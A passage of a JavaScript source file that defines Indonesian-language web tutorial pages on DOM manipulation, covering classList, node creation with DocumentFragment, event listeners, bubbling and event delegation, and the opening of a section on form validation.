            'Terjemahannya **pemisahan urusan**. Prinsip bahwa tampilan diurus CSS dan perilaku diurus JavaScript. Wujud praktisnya di sub-bab ini: JavaScript sebaiknya hanya **menambah atau menghapus class**, lalu CSS yang memutuskan class itu terlihat seperti apa.',
        },
      ),

      h2('`classList`'),
      code(
        'js',
        `
        el.classList.add('aktif');
        el.classList.remove('tersembunyi');
        el.classList.toggle('terbuka');            // ada -> hapus, tidak ada -> tambah
        el.classList.toggle('terbuka', kondisi);   // paksa sesuai boolean
        el.classList.contains('aktif');            // true/false
        el.classList.replace('lama', 'baru');

        el.classList.add('a', 'b', 'c');           // beberapa sekaligus
        `,
      ),
      callout(
        'tip',
        'Bentuk `toggle(nama, kondisi)` menghapus banyak `if`',
        '`el.classList.toggle("error", !valid)` menggantikan empat baris if/else, dan tidak mungkin lupa cabang sebaliknya.',
      ),

      h2('Kenapa class mengalahkan style inline'),
      code(
        'js',
        `
        // SALAH: tampilan tersebar di JavaScript, tidak bisa dipakai ulang,
        // sulit di-override, dan mengabaikan media query serta dark mode.
        el.style.backgroundColor = '#e5a13c';
        el.style.padding = '12px';
        el.style.borderRadius = '8px';

        // BENAR: tampilan tetap di CSS, JavaScript hanya mengubah keadaan
        el.classList.add('kartu-aktif');
        `,
      ),
      p('Aturan praktisnya: **JavaScript mengubah keadaan, CSS memutuskan tampilannya.**'),

      h2('Kapan `style` memang tepat'),
      code(
        'js',
        `
        // Nilai yang dihitung saat berjalan dan tidak mungkin ditulis di CSS
        bar.style.width = \`\${persen}%\`;
        tooltip.style.transform = \`translate(\${x}px, \${y}px)\`;
        `,
      ),

      h2('CSS custom property — jembatan terbaik'),
      code(
        'css',
        `
        .bar {
          width: var(--progres, 0%);
          background: var(--warna-bar, currentColor);
          transition: width 300ms ease-out;
        }
        `,
      ),
      code(
        'js',
        `
        // JavaScript hanya mengoper ANGKA; CSS yang memutuskan cara memakainya
        bar.style.setProperty('--progres', \`\${persen}%\`);

        // Membacanya kembali
        getComputedStyle(bar).getPropertyValue('--progres');
        `,
      ),
      callout(
        'info',
        'Ini pola yang dipakai website ini sendiri',
        'Tema terang/gelap di sini bekerja persis begitu: JavaScript hanya menambah atau menghapus class `dark` pada `<html>`, dan seluruh palet berpindah karena CSS variable-nya berubah. Tidak ada satu pun warna yang ditulis dari JavaScript.',
      ),

      h2('Membaca style yang benar-benar berlaku'),
      code(
        'js',
        `
        el.style.color;                          // '' — hanya membaca style INLINE
        getComputedStyle(el).color;              // 'rgb(25, 23, 19)' — hasil akhir

        // getComputedStyle memaksa perhitungan layout. Jangan panggil di dalam loop.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`classList.toggle(nama, kondisi)` menggantikan if/else tampilan.',
        'JavaScript mengubah keadaan; CSS memutuskan tampilan.',
        '`style` langsung hanya untuk nilai yang dihitung saat berjalan.',
        'CSS custom property adalah jembatan terbaik antara keduanya.',
        '`getComputedStyle` membaca hasil akhir, tapi memicu perhitungan layout.',
      ),
      references(
        {
          label: 'Element.classList',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/classList',
          source: 'MDN',
          note: 'Seluruh method `add`/`remove`/`toggle`/`replace`, termasuk bentuk `toggle(nama, kondisi)`.',
        },
        {
          label: 'Using CSS custom properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascading_variables/Using_CSS_custom_properties',
          source: 'MDN',
          note: 'Jembatan antara JavaScript dan CSS yang dipakai untuk tema di website ini.',
        },
        {
          label: 'CSSStyleDeclaration.setProperty()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleDeclaration/setProperty',
          source: 'MDN',
          note: 'Satu-satunya cara menulis nama property berawalan `--` dari JavaScript.',
        },
        {
          label: 'Window.getComputedStyle()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle',
          source: 'MDN',
          note: 'Membaca nilai yang benar-benar berlaku — beserta peringatan biayanya.',
        },
        {
          label: 'Avoid large, complex layouts and layout thrashing',
          href: 'https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing',
          source: 'web.dev',
          note: 'Alasan `getComputedStyle` di dalam loop berbahaya — dibahas tuntas di Sub-bab 4.12.',
        },
      ),
    ],
  ),

  written(
    'membuat-menghapus-node',
    'Membuat, Menyisipkan & Menghapus Node',
    12,
    'Membangun elemen dari kode dengan aman dan efisien.',
    [
      terms(
        {
          term: 'createElement',
          meaning:
            'Method untuk **membuat elemen baru dari kode**, misalnya `document.createElement("li")`. Yang penting dipahami: elemen itu belum ada di halaman — ia mengambang di memori sampai kamu benar-benar menyisipkannya ke dalam pohon DOM. Inilah jalur aman membangun tampilan, karena isinya diisi lewat `textContent`, bukan dengan merangkai HTML.',
        },
        {
          term: 'append / appendChild',
          meaning:
            'Menyisipkan node sebagai **anak terakhir**. `append()` lebih baru dan lebih longgar — ia menerima beberapa node sekaligus dan bahkan teks biasa. `appendChild()` versi lama, hanya menerima satu node. Untuk kode baru, pakai `append()`.',
        },
        {
          term: 'prepend',
          meaning:
            'Menyisipkan sebagai **anak pertama**, kebalikan dari `append`. Berguna untuk daftar yang item terbarunya harus muncul di atas.',
        },
        {
          term: 'before / after',
          meaning:
            'Menyisipkan node sebagai **saudara** — tepat sebelum atau sesudah elemen acuan, bukan di dalamnya. Pembedaan "di dalam" versus "di samping" inilah yang membedakan keempat method penyisipan ini.',
        },
        {
          term: 'remove',
          meaning:
            'Menghapus elemen dari pohon DOM. Perlu diketahui: elemennya **tidak langsung hilang dari memori** kalau masih ada variabel yang menunjuknya. Karena itu kamu masih bisa menyisipkannya kembali nanti — sifat yang berguna, tapi juga sumber kebocoran memori kalau tidak disengaja.',
        },
        {
          term: 'DocumentFragment',
          meaning:
            'Terjemahan bebasnya **potongan dokumen**. Wadah sementara di luar pohon DOM untuk menampung banyak elemen sebelum disisipkan. Manfaatnya besar: menyisipkan seratus elemen satu per satu memicu perhitungan ulang berkali-kali, sementara menyisipkan satu fragment berisi seratus elemen hanya sekali.',
        },
        {
          term: 'cloneNode',
          meaning:
            'Menggandakan sebuah node. Argumennya menentukan kedalaman: `cloneNode(true)` menyalin beserta seluruh isinya, `cloneNode(false)` hanya elemen terluarnya. Satu hal yang **tidak ikut tersalin**: event listener yang dipasang dengan `addEventListener`.',
        },
        {
          term: 'template',
          meaning:
            'Tag `<template>` yang isinya **diurai tapi tidak digambar** ke layar. Dipakai sebagai cetakan yang digandakan berkali-kali. Ini cara paling rapi membuat daftar berulang tanpa merangkai HTML dari teks sama sekali.',
        },
        {
          term: 'batching',
          meaning:
            'Terjemahannya **menggabungkan menjadi satu rombongan**. Mengumpulkan banyak perubahan lalu menerapkannya sekaligus, alih-alih satu per satu. Prinsip ini yang mendasari `DocumentFragment`, dan ia kembali muncul di Sub-bab 4.12 sebagai kunci performa DOM.',
        },
      ),

      h2('Membuat'),
      code(
        'js',
        `
        const li = document.createElement('li');
        li.textContent = judul;             // aman untuk data pengguna
        li.className = 'item';
        li.dataset.id = id;

        const teks = document.createTextNode('halo');
        `,
      ),

      h2('Menyisipkan'),
      code(
        'js',
        `
        wadah.append(li);          // di akhir — bisa beberapa sekaligus, boleh string
        wadah.prepend(li);         // di awal
        acuan.before(li);          // sebelum elemen acuan
        acuan.after(li);           // sesudah
        acuan.replaceWith(li);     // menggantikan

        wadah.append(a, b, 'teks biasa');   // campur elemen dan string
        `,
      ),
      callout(
        'info',
        'API lama yang masih sering kamu temui',
        '`appendChild`, `insertBefore`, `removeChild` masih bekerja dan ada di banyak kode. API modern (`append`, `before`, `remove`) lebih pendek, menerima beberapa argumen, dan menerima string — pakai yang modern untuk kode baru.',
      ),

      h2('Menghapus dan memindahkan'),
      code(
        'js',
        `
        el.remove();                 // hapus dirinya sendiri
        wadah.replaceChildren();     // kosongkan seluruh isi

        // Menyisipkan elemen yang SUDAH ada di DOM akan MEMINDAHKANNYA,
        // bukan menyalin. Ini fitur, dan sering mengejutkan.
        wadahLain.append(elemenYangSudahAda);   // pindah, bukan duplikat

        const salinan = el.cloneNode(true);     // true = ikut seluruh isinya
        `,
      ),

      h2('Kenapa menyisipkan di dalam loop itu mahal'),
      code(
        'js',
        `
        // LAMBAT: setiap append menyentuh DOM yang sedang tampil
        for (const item of seribuItem) {
          wadah.append(buatBaris(item));
        }
        `,
      ),
      code(
        'js',
        `
        // CEPAT: rakit di luar DOM dulu, sisipkan sekali
        const fragment = document.createDocumentFragment();
        for (const item of seribuItem) {
          fragment.append(buatBaris(item));
        }
        wadah.append(fragment);       // satu kali sentuhan ke DOM

        // Alternatif yang sama cepatnya dan lebih pendek:
        wadah.append(...seribuItem.map(buatBaris));
        `,
      ),
      callout(
        'tip',
        'Kenapa `DocumentFragment` cepat',
        'Ia adalah wadah yang tidak berada di dalam dokumen, jadi menambahkan sesuatu ke dalamnya tidak memicu perhitungan layout. Saat disisipkan, isinya dipindahkan dan fragment-nya sendiri menghilang — tidak ada elemen pembungkus tambahan.',
      ),

      h2('Pola merender daftar dengan aman'),
      code(
        'js',
        `
        function renderDaftar(wadah, items) {
          wadah.replaceChildren();                    // kosongkan

          if (items.length === 0) {
            const kosong = document.createElement('p');
            kosong.className = 'kosong';
            kosong.textContent = 'Belum ada tugas. Tambahkan yang pertama.';
            wadah.append(kosong);
            return;                                   // keadaan kosong ditangani
          }

          const fragment = document.createDocumentFragment();

          for (const item of items) {
            const li = document.createElement('li');
            li.dataset.id = item.id;

            const label = document.createElement('span');
            label.textContent = item.judul;          // AMAN — bukan innerHTML

            const hapus = document.createElement('button');
            hapus.type = 'button';
            hapus.dataset.aksi = 'hapus';
            hapus.textContent = 'Hapus';

            li.append(label, hapus);
            fragment.append(li);
          }

          wadah.append(fragment);
        }
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`append`, `prepend`, `before`, `after`, `remove` — API modern, menerima beberapa argumen.',
        'Menyisipkan elemen yang sudah ada akan memindahkannya, bukan menyalin.',
        'Rakit di `DocumentFragment` lalu sisipkan sekali untuk daftar besar.',
        '`replaceChildren()` mengosongkan wadah tanpa `innerHTML = ""`.',
        'Selalu tangani keadaan kosong secara eksplisit.',
      ),
      references(
        {
          label: 'Document.createElement()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement',
          source: 'MDN',
          note: 'Jalur aman membangun elemen dari kode, tanpa merangkai HTML dari teks.',
        },
        {
          label: 'Element.append()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/append',
          source: 'MDN',
          note: 'Bedanya dengan `appendChild` lama: menerima beberapa node sekaligus dan juga teks biasa.',
        },
        {
          label: 'DocumentFragment',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment',
          source: 'MDN',
          note: 'Wadah sementara yang membuat penyisipan daftar besar hanya memicu satu kali perhitungan ulang.',
        },
        {
          label: 'Element.replaceChildren()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/replaceChildren',
          source: 'MDN',
          note: 'Cara mengosongkan wadah tanpa `innerHTML = ""` yang memicu parsing HTML.',
        },
        {
          label: 'The template element',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template',
          source: 'MDN',
          note: 'Cetakan yang diurai tapi tidak digambar — pola paling rapi untuk daftar berulang.',
        },
      ),
    ],
  ),

  written(
    'event-dasar',
    'Event: `addEventListener` & objek Event',
    12,
    'Bereaksi terhadap tindakan pengguna — dan membersihkannya kembali.',
    [
      terms(
        {
          term: 'event',
          meaning:
            'Terjemahannya **peristiwa**. Sesuatu yang terjadi pada halaman dan bisa kamu tanggapi: klik, ketikan, gulir, pengiriman form, gambar selesai dimuat. Browser mengirimkan objek berisi keterangan lengkap tentang peristiwa itu ke fungsi yang kamu daftarkan.',
        },
        {
          term: 'addEventListener',
          meaning:
            'Gabungan *add* (menambah), *event*, dan *listener* (pendengar). Method untuk **mendaftarkan fungsi yang akan dipanggil** setiap kali peristiwa tertentu terjadi. Keunggulannya atas cara lama `el.onclick = ...`: kamu bisa memasang **banyak** pendengar untuk peristiwa yang sama tanpa saling menimpa.',
        },
        {
          term: 'listener',
          meaning:
            'Terjemahannya **pendengar**. Fungsi yang kamu daftarkan untuk menanggapi sebuah peristiwa. Istilah *handler* (penangan) juga sering dipakai dengan arti yang sama.',
        },
        {
          term: 'removeEventListener',
          meaning:
            'Melepas pendengar yang sudah terdaftar. Syaratnya ketat dan sering menjebak: ia butuh **referensi fungsi yang sama persis**. Karena itu pendengar yang didaftarkan sebagai fungsi anonim `() => {}` **tidak akan pernah bisa dilepas** — setiap penulisan menghasilkan fungsi baru.',
        },
        {
          term: 'e / event',
          meaning:
            'Nama parameter yang lazim untuk objek peristiwa: `(e) => ...` atau `(event) => ...`. Keduanya sama saja — kebiasaan penamaan, bukan aturan.',
        },
        {
          term: 'e.target',
          meaning:
            'Elemen yang **benar-benar memicu** peristiwa — tempat kliknya mendarat. Bedakan baik-baik dari `e.currentTarget`, yaitu elemen tempat pendengarnya **dipasang**. Pada klik biasa keduanya sering sama, tapi pada event delegation di sub-bab berikutnya keduanya hampir selalu berbeda, dan di situlah letak seluruh kegunaannya.',
        },
        {
          term: 'preventDefault',
          meaning:
            'Membatalkan **perilaku bawaan browser** untuk peristiwa itu — form yang berpindah halaman saat dikirim, tautan yang membuka alamat, checkbox yang berubah tercentang. Perlu diingat, ia hanya membatalkan aksi bawaan; ia **tidak** menghentikan peristiwanya menjalar ke elemen induk.',
        },
        {
          term: 'once',
          meaning:
            'Opsi `{ once: true }` yang membuat pendengar **otomatis melepas dirinya** setelah berjalan satu kali. Menghemat pekerjaan pembersihan untuk hal-hal seperti tombol yang hanya boleh diklik sekali.',
        },
        {
          term: 'passive',
          meaning:
            'Opsi `{ passive: true }` yang menjadi **janji kepada browser** bahwa pendengar ini tidak akan memanggil `preventDefault`. Berkat janji itu, browser boleh langsung menggulir tanpa menunggu kodemu selesai — dan gulirannya terasa jauh lebih lancar.',
        },
        {
          term: 'memory leak',
          meaning:
            'Terjemahannya **kebocoran memori**. Pendengar yang tidak pernah dilepas menahan elemennya tetap hidup di memori meski sudah dihapus dari halaman. Pada aplikasi yang berjalan lama, kebocoran seperti ini menumpuk sampai terasa berat.',
        },
      ),

      h2('Dasar'),
      code(
        'js',
        `
        function tangani(event) {
          console.log(event.type);   // 'click'
        }

        tombol.addEventListener('click', tangani);
        tombol.removeEventListener('click', tangani);   // butuh referensi fungsi YANG SAMA
        `,
      ),
      callout(
        'warning',
        'Fungsi anonim tidak bisa dilepas',
        '`addEventListener("click", () => {})` membuat fungsi baru setiap dipanggil, jadi `removeEventListener` tidak akan pernah menemukan pasangannya. Simpan referensinya, atau pakai `AbortController`.',
      ),
      code(
        'js',
        `
        // Cara modern melepas banyak listener sekaligus
        const controller = new AbortController();

        tombol.addEventListener('click', a, { signal: controller.signal });
        input.addEventListener('input', b, { signal: controller.signal });
        window.addEventListener('resize', c, { signal: controller.signal });

        controller.abort();   // ketiganya lepas sekaligus
        `,
      ),

      h2('Objek Event'),
      code(
        'js',
        `
        wadah.addEventListener('click', (e) => {
          e.type;             // 'click'
          e.target;           // elemen yang BENAR-BENAR diklik (bisa anak terdalam)
          e.currentTarget;    // elemen tempat listener terpasang — di sini: wadah
          e.timeStamp;

          // Khusus mouse
          e.clientX; e.clientY;      // relatif viewport
          e.button;                  // 0 kiri, 1 tengah, 2 kanan

          // Khusus keyboard
          e.key;                     // 'Enter', 'a', 'Escape'
          e.ctrlKey; e.metaKey; e.shiftKey;
        });
        `,
      ),
      callout(
        'danger',
        '`target` vs `currentTarget` — sumber bug yang sering',
        'Klik pada `<button><span>Hapus</span></button>` membuat `e.target` bernilai `<span>`, bukan tombolnya. Untuk mendapatkan elemen yang kamu maksud, pakai `e.target.closest("button")`.',
      ),

      h2('`preventDefault` dan `stopPropagation`'),
      code(
        'js',
        `
        form.addEventListener('submit', (e) => {
          e.preventDefault();       // batalkan perilaku bawaan (reload halaman)
          kirimLewatFetch();
        });

        link.addEventListener('click', (e) => {
          e.preventDefault();       // jangan pindah halaman
        });

        // stopPropagation menghentikan event naik ke induk.
        // Pakai HEMAT: ia sering memutus listener global orang lain
        // (menutup dropdown saat klik di luar, misalnya).
        e.stopPropagation();
        `,
      ),

      h2('Opsi listener'),
      table(
        ['Opsi', 'Gunanya'],
        [
          ['`once: true`', 'Otomatis lepas setelah dipanggil sekali'],
          [
            '`passive: true`',
            'Berjanji tidak memanggil `preventDefault` — membuat scroll tetap mulus',
          ],
          ['`capture: true`', 'Tangkap saat turun, bukan saat naik'],
          ['`signal`', 'Lepas lewat `AbortController`'],
        ],
      ),
      code(
        'js',
        `
        // Untuk listener scroll dan touch, passive hampir selalu benar
        window.addEventListener('scroll', tangani, { passive: true });

        dialog.addEventListener('close', bersihkan, { once: true });
        `,
      ),

      h2('Membersihkan listener'),
      code(
        'js',
        `
        // Listener pada window/document TIDAK hilang saat elemenmu dihapus.
        // Kalau tidak dilepas, ia terus berjalan dan menahan objek di memori —
        // ini kebocoran memori yang paling umum di aplikasi satu halaman.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Fungsi anonim tidak bisa dilepas; simpan referensinya atau pakai `signal`.',
        '`e.target` adalah yang diklik; `e.currentTarget` adalah tempat listener dipasang.',
        '`e.target.closest("button")` mendapatkan elemen yang kamu maksud.',
        '`{ passive: true }` untuk scroll dan touch; `{ once: true }` untuk sekali pakai.',
        'Listener pada `window`/`document` wajib dilepas — kalau tidak, memori bocor.',
      ),
      references(
        {
          label: 'EventTarget.addEventListener()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener',
          source: 'MDN',
          note: 'Seluruh opsi `once`, `passive`, `capture`, dan `signal` yang dipakai di sub-bab ini.',
        },
        {
          label: 'Event',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event',
          source: 'MDN',
          note: 'Property objek peristiwa, termasuk perbedaan `target` dan `currentTarget`.',
        },
        {
          label: 'Event.preventDefault()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault',
          source: 'MDN',
          note: 'Menegaskan bahwa ia membatalkan aksi bawaan, bukan menghentikan penjalaran peristiwa.',
        },
        {
          label: 'Improving scrolling performance with passive listeners',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#improving_scrolling_performance_with_passive_listeners',
          source: 'MDN',
          note: 'Alasan `{ passive: true }` membuat guliran terasa jauh lebih lancar.',
        },
        {
          label: 'AbortSignal',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal',
          source: 'MDN',
          note: 'Cara modern melepas banyak pendengar sekaligus — pola yang sama dengan Sub-bab 3.8.',
        },
      ),
    ],
  ),

  written(
    'bubbling-delegation',
    'Bubbling, Capturing & Event Delegation',
    13,
    'Satu listener untuk seratus elemen — termasuk yang belum ada.',
    [
      terms(
        {
          term: 'bubbling',
          meaning:
            'Terjemahannya **menggelembung**. Perjalanan peristiwa **naik** dari elemen yang diklik menuju induknya, terus ke atas sampai `document`. Nama itu menggambarkan gelembung yang naik ke permukaan air. Ini fase **bawaan** tempat pendengarmu berjalan kalau kamu tidak mengaturnya — dan sifat inilah yang membuat event delegation mungkin.',
        },
        {
          term: 'capturing',
          meaning:
            'Terjemahannya **penangkapan**. Fase kebalikan: peristiwa **turun** dari `document` menuju elemen yang diklik, sebelum bubbling dimulai. Untuk mendengarkan di fase ini kamu harus memintanya secara khusus dengan `{ capture: true }`. Jarang dibutuhkan, tapi berguna untuk mencegat peristiwa sebelum sampai ke tujuannya.',
        },
        {
          term: 'target phase',
          meaning:
            'Fase di tengah, saat peristiwa **tiba tepat di elemen** yang memicunya. Urutan lengkapnya karena itu: turun (capturing) → tiba (target) → naik (bubbling).',
        },
        {
          term: 'event delegation',
          meaning:
            'Terjemahannya **pendelegasian peristiwa**. Memasang **satu** pendengar di elemen induk untuk menangani peristiwa dari **semua** anaknya, alih-alih satu pendengar per anak. Dua keuntungannya besar: seratus baris cukup satu pendengar, dan **baris yang ditambahkan nanti langsung ikut bekerja** tanpa perlu didaftarkan ulang.',
        },
        {
          term: 'closest',
          meaning:
            'Method yang menelusuri **ke atas** dari sebuah elemen — dirinya sendiri lebih dulu, lalu induknya, terus naik — mencari yang cocok dengan selector. Inilah pasangan wajib event delegation: klik bisa mendarat di ikon di dalam tombol, dan `e.target.closest("button")` memastikan kamu tetap mendapat tombolnya.',
        },
        {
          term: 'stopPropagation',
          meaning:
            'Menghentikan peristiwa agar **tidak menjalar lebih jauh** ke elemen berikutnya. Pakailah dengan sangat hemat: ia membuat pendengar di tingkat atas — termasuk milik pustaka lain — diam-diam berhenti bekerja, dan penyebabnya sangat sulit dilacak dari tempat kejadian.',
        },
        {
          term: 'stopImmediatePropagation',
          meaning:
            'Lebih keras lagi: selain menghentikan penjalaran, ia juga membatalkan **pendengar lain pada elemen yang sama** yang belum sempat berjalan. Nyaris selalu berlebihan, dan hampir selalu ada cara yang lebih baik.',
        },
        {
          term: 'event.target vs currentTarget',
          meaning:
            'Pada event delegation keduanya **hampir selalu berbeda**, dan di situlah letak seluruh polanya. `target` adalah elemen yang benar-benar diklik (misalnya sebuah tombol di dalam baris), sementara `currentTarget` adalah wadah tempat pendengarnya dipasang.',
        },
        {
          term: 'event yang tidak menggelembung',
          meaning:
            'Sebagian peristiwa **tidak** naik ke induknya — `focus`, `blur`, `load`, dan `mouseenter` termasuk di dalamnya. Untuk kasus fokus, pakai padanannya yang menggelembung: `focusin` dan `focusout`.',
        },
      ),

      h2('Tiga fase perjalanan event'),
      code(
        'text',
        `
        Klik pada <button> di dalam <li> di dalam <ul>:

        1. CAPTURING  document -> ul -> li -> button   (turun)
        2. TARGET     button                            (sampai)
        3. BUBBLING   button -> li -> ul -> document    (naik)

        Secara default, listener berjalan pada fase BUBBLING.
        `,
      ),
      code(
        'js',
        `
        ul.addEventListener('click', () => console.log('ul (bubbling)'));
        ul.addEventListener('click', () => console.log('ul (capturing)'), { capture: true });
        btn.addEventListener('click', () => console.log('button'));

        // Output saat tombol diklik:
        // ul (capturing)
        // button
        // ul (bubbling)
        `,
      ),

      h2('Event delegation'),
      code(
        'js',
        `
        // SALAH: satu listener per baris. 100 baris = 100 listener,
        // dan baris yang ditambahkan nanti tidak punya listener sama sekali.
        document.querySelectorAll('.hapus').forEach((btn) => {
          btn.addEventListener('click', hapusBaris);
        });
        `,
      ),
      code(
        'js',
        `
        // BENAR: satu listener di wadah, selamanya
        daftar.addEventListener('click', (e) => {
          const tombol = e.target.closest('[data-aksi]');
          if (!tombol || !daftar.contains(tombol)) return;   // klik di luar sasaran

          const id = tombol.closest('[data-id]')?.dataset.id;

          switch (tombol.dataset.aksi) {
            case 'hapus':  hapus(id); break;
            case 'ubah':   ubah(id); break;
            case 'toggle': toggle(id); break;
          }
        });
        `,
      ),
      p(
        'Baris yang ditambahkan lima menit kemudian otomatis ikut tertangani. Tidak ada listener yang perlu dipasang atau dilepas.',
      ),

      callout(
        'tip',
        'Kenapa `closest` wajib di sini',
        '`e.target` bisa berupa `<span>` atau ikon di dalam tombol. `closest("[data-aksi]")` naik dari titik klik sampai menemukan elemen yang punya atribut itu — yang persis kamu maksud, apa pun isi dalamnya.',
      ),

      h2('Event yang tidak menggelembung'),
      table(
        ['Event', 'Menggelembung?', 'Solusinya'],
        [
          ['`click`, `input`, `change`, `submit`', 'Ya', '—'],
          ['`focus` / `blur`', '**Tidak**', 'Pakai `focusin` / `focusout`'],
          ['`mouseenter` / `mouseleave`', '**Tidak**', 'Pakai `mouseover` / `mouseout`'],
          ['`scroll` (pada elemen)', '**Tidak**', 'Pakai `capture: true`'],
          ['`load`, `error`', '**Tidak**', 'Pasang langsung pada elemennya'],
        ],
      ),

      h2('Jebakan `stopPropagation`'),
      code(
        'js',
        `
        // Dropdown menutup saat klik di mana pun
        document.addEventListener('click', tutupSemuaDropdown);

        // Lalu seseorang menambahkan ini di dalam kartu:
        kartu.addEventListener('click', (e) => e.stopPropagation());

        // Sekarang dropdown TIDAK PERNAH tertutup kalau kliknya di dalam kartu.
        // Bugnya muncul di tempat yang sama sekali berbeda dari penyebabnya.
        `,
      ),
      callout(
        'warning',
        'Hampir selalu ada cara lain selain `stopPropagation`',
        'Alih-alih menghentikan event, periksa di listener global: `if (dropdown.contains(e.target)) return;`. Efeknya lokal dan tidak memutus perilaku komponen lain.',
      ),

      h2('Contoh utuh'),
      playground(
        'vanilla',
        {
          '/index.html': `<!doctype html>
<html lang="id">
  <head><meta charset="utf-8" /><title>Event Delegation</title></head>
  <body>
    <h1>Daftar tugas</h1>
    <button id="tambah" type="button">Tambah baris</button>
    <ul id="daftar"></ul>
    <script type="module" src="./index.js"></script>
  </body>
</html>
`,
          '/index.js': `const daftar = document.querySelector('#daftar');
let nomor = 0;

document.querySelector('#tambah').addEventListener('click', () => {
  nomor++;
  const li = document.createElement('li');
  li.dataset.id = String(nomor);

  const label = document.createElement('span');
  label.textContent = 'Tugas ' + nomor;

  const hapus = document.createElement('button');
  hapus.type = 'button';
  hapus.dataset.aksi = 'hapus';
  hapus.textContent = 'Hapus';

  li.append(label, ' ', hapus);
  daftar.append(li);
});

// SATU listener — menangani baris yang sudah ada maupun yang belum dibuat
daftar.addEventListener('click', (e) => {
  const tombol = e.target.closest('[data-aksi]');
  if (!tombol) return;

  const baris = tombol.closest('[data-id]');
  console.log('Menghapus baris', baris.dataset.id);
  baris.remove();
});

// Cobalah: tambah lima baris, lalu hapus. Perhatikan tidak ada listener
// yang pernah dipasang ke tombol hapus mana pun.
`,
        },
        'Event delegation — coba sendiri',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Event turun (capturing), sampai (target), lalu naik (bubbling). Default: bubbling.',
        'Satu listener di wadah menangani semua anak, termasuk yang ditambahkan kemudian.',
        '`e.target.closest(selector)` mendapatkan elemen yang kamu maksud, bukan yang persis diklik.',
        '`focus`, `blur`, `mouseenter`, `mouseleave` tidak menggelembung — ada penggantinya.',
        '`stopPropagation` memutus listener global orang lain; hampir selalu ada cara lain.',
      ),
      references(
        {
          label: 'Event bubbling and capture',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Event_bubbling',
          source: 'MDN',
          note: 'Penjelasan ketiga fase beserta contoh event delegation dari sumber resminya.',
        },
        {
          label: 'Element.closest()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/closest',
          source: 'MDN',
          note: 'Menegaskan bahwa pencariannya dimulai dari elemen itu sendiri, baru naik ke induknya.',
        },
        {
          label: 'Event.stopPropagation()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event/stopPropagation',
          source: 'MDN',
          note: 'Termasuk bedanya dengan `stopImmediatePropagation` yang lebih agresif.',
        },
        {
          label: 'Element: focusin event',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/focusin_event',
          source: 'MDN',
          note: 'Pengganti `focus` yang menggelembung — dibutuhkan agar delegation tetap bisa dipakai.',
        },
        {
          label: 'Event dispatch and DOM event flow',
          href: 'https://dom.spec.whatwg.org/#dispatching-events',
          source: 'WHATWG DOM',
          note: 'Spesifikasi resmi urutan capturing, target, dan bubbling.',
        },
      ),
    ],
  ),

  written(
    'form-input',
    'Form & Input: `FormData`, validasi',
    13,
    'Mengambil dan memvalidasi masukan pengguna — dan kenapa validasi klien bukan pengaman.',
    [
      terms(
        {
          term: 'form',
          meaning:
            'Elemen `<form>` yang mengumpulkan masukan pengguna. Yang wajib diingat: peristiwa `submit` terjadi pada **form**, bukan pada tombolnya. Menekan Enter di dalam sebuah input juga mengirim form, dan pendengar yang hanya dipasang di tombol akan melewatkannya sepenuhnya.',
        },
        {
          term: 'input vs change',
          meaning:
            'Dua peristiwa yang mirip tapi berbeda waktunya. `input` terpicu **setiap ketikan** — cocok untuk pratinjau langsung dan pencarian. `change` terpicu **setelah selesai dan kehilangan fokus**, atau saat sebuah pilihan dibuat — cocok untuk hal yang mahal, agar tidak dijalankan pada tiap huruf.',
        },
        {
          term: 'submit',
          meaning:
            'Peristiwa pengiriman form. Perilaku bawaannya adalah **memuat ulang halaman**, dan itulah yang dibatalkan `e.preventDefault()`. Kalau kamu pernah melihat halaman berkedip lalu semua data hilang, penyebabnya hampir selalu `preventDefault` yang lupa ditulis.',
        },
        {
          term: 'FormData',
          meaning:
            'Objek yang **mengumpulkan seluruh isi form sekaligus** tanpa perlu menyeleksi tiap input satu per satu. Kuncinya ada di atribut `name` tiap input — tanpa `name`, sebuah input **tidak ikut terbaca** sama sekali. Ini kesalahan yang sangat sering terjadi dan tidak memunculkan error apa pun.',
        },
        {
          term: 'name',
          meaning:
            'Atribut yang menjadi **kunci** sebuah input di dalam `FormData` maupun saat dikirim ke server. Berbeda dari `id` yang dipakai untuk menghubungkan `<label>` dan untuk seleksi dari JavaScript. Sebuah input bisa punya keduanya, dan biasanya memang perlu.',
        },
        {
          term: 'validasi klien',
          meaning:
            'Pemeriksaan masukan yang berjalan **di browser**. Kegunaannya nyata: pengguna dapat jawaban seketika tanpa menunggu jaringan. Tapi ia **bukan pengaman** — siapa pun bisa mematikannya lewat DevTools atau mengirim permintaan langsung tanpa membuka halamanmu sama sekali.',
        },
        {
          term: 'validasi server',
          meaning:
            'Pemeriksaan yang berjalan **di server**, dan **inilah satu-satunya yang benar-benar mengamankan**. Aturannya tegas dan tidak bisa ditawar: validasi klien untuk kenyamanan, validasi server untuk keamanan. Keduanya dibutuhkan, dan yang satu tidak pernah menggantikan yang lain.',
        },
        {
          term: 'Constraint Validation API',
          meaning:
